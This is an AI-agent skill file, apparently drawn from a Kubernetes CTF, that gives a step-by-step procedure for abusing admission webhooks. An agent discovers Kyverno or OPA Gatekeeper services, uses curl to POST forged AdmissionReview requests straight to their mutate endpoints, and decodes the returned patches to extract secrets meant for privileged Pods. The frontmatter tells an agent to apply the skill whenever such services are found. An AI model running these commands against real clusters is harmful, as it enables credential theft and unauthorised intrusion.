---
name: k8s-webhook-abuse
description: "Kubernetes Admission Webhook abuse and policy engine exploitation. Use when the cluster has Kyverno/OPA Gatekeeper/custom webhooks, when DNS scanning discovers kyverno-svc or gatekeeper services, or when you need to extract secrets injected by a Mutating Webhook. Core technique: forging AdmissionReview requests. Any scenario where a Webhook service or policy engine is discovered in K8s should use this skill"
zh-signals: "滥用 Kubernetes Admission Webhook 与策略引擎，通过伪造 AdmissionReview 请求提取注入的 Secret。信号:K8s Webhook,Kyverno,OPA Gatekeeper,AdmissionReview,准入控制"
when-to-use: >-
  Use when a cluster has Kyverno/OPA Gatekeeper or custom webhooks, a webhook
  service is discovered via DNS scanning, or you need to extract secrets
  injected by a mutating webhook.
metadata:
  tags: "k8s,kubernetes,webhook,kyverno,opa,gatekeeper,admission,mutate,validate,policy engine,admission control"
  category: "cloud"
---

# Kubernetes Admission Webhook Abuse

The Admission Webhook in K8s is the gatekeeper of cluster security, responsible for enforcing policy when resources are created or modified (injecting secrets, environment variables, etc.). The problem is that many webhooks do not verify whether a request comes from the API Server. This means an attacker can send forged AdmissionReview requests directly to the webhook from any Pod, tricking it into handing over secrets that should have been injected into privileged Pods.

```
Normal flow:
  kubectl create pod → API Server → Mutating Webhook → (inject secret) → storage

Attack flow:
  Attacker Pod → POST directly to Webhook → Webhook returns patch (contains secret)
```

---

## Phase 1: Discover Webhook Services

```bash
# DNS scan to discover policy engines
k8spider scan -subnet <service-cidr>

# Common webhook service names
# Kyverno:
#   kyverno-svc.kyverno.svc.cluster.local (443)
#   kyverno-cleanup-controller.kyverno.svc.cluster.local
# OPA Gatekeeper:
#   gatekeeper-webhook-service.gatekeeper-system.svc.cluster.local
# Custom:
#   *-webhook-service.*

# Detect the webhook endpoint
curl -k https://kyverno-svc.kyverno.svc.cluster.local/mutate
# A GET response returning "only POST/OPTIONS supported" → the service is reachable and does not verify the origin
```

---

## Phase 2: Craft an AdmissionReview Request

Build a fake Pod creation request and send it to the webhook to trick it into returning the mutation patch.

The complete JSON payload template → [references/admission-review-template.md](references/admission-review-template.md)

Key field notes:
- `namespace` — must match the policy's match condition (e.g. `sensitive-ns`), otherwise the webhook will not trigger the mutation
- `kind` / `requestKind` — must be filled in; a missing value causes Kyverno to panic
- `operation` — usually `CREATE`
- `object.spec.containers` — must contain at least one container definition

### Sending the Request

```bash
# Save the JSON (get the full template from references/admission-review-template.md)
cat > /tmp/admission.json << 'EOF'
... full JSON ...
EOF

# Send to the Kyverno mutate endpoint
curl -k -X POST \
  -H "Content-Type: application/json" \
  -d @/tmp/admission.json \
  https://kyverno-svc.kyverno.svc.cluster.local/mutate

# Notes (hard-won lessons):
# - HTTPS + -k is mandatory (self-signed certificate)
# - Content-Type: application/json is mandatory
# - Do not add --http1.1 (Kyverno needs HTTP/2, otherwise the stream breaks)
# - The namespace must match the policy's match condition
```

---

## Phase 3: Parse the Returned Patch

`response.patch` in the response is a Base64-encoded JSONPatch:

```bash
# Extract the patch from the response
echo '<patch-base64>' | base64 -d | jq .

# Sample output:
# [{"op":"add","path":"/spec/containers/0/env","value":[{"name":"FLAG","value":"wiz_k8s_lan_party{...}"}]}]
```

---

## Phase 4: Other Webhook Attacks

### OPA Gatekeeper

Endpoint and request format → [references/admission-review-template.md](references/admission-review-template.md)

### Kyverno Null Pointer Panic (confirm exploitability)

Send an incomplete AdmissionReview missing `requestKind`/`requestResource` and Kyverno will panic (null pointer dereference). This is not directly useful, but it confirms that the webhook does not verify the caller's identity.

---

## Common Policy Engine Endpoints

| Engine | Endpoint | Port | Type |
|------|------|------|------|
| Kyverno | `/mutate`, `/validate` | 443 | Mutating + Validating |
| OPA Gatekeeper | `/v1/admit` | 443 | Validating |
| Custom | `/mutate`, `/validate`, `/webhook` | 443/8443 | Depends on implementation |

---

## Key Takeaways

- **The webhook does not verify the origin = any Pod can forge requests**
- The patch returned by a Mutating Webhook may contain injected secrets/flags/tokens
- The `namespace` field must match the policy's match condition to trigger the mutation
- The `requestKind` and `requestResource` fields must not be empty (otherwise Kyverno panics)
- Use HTTP/2 (do not add `--http1.1`), and always send `Content-Type: application/json`
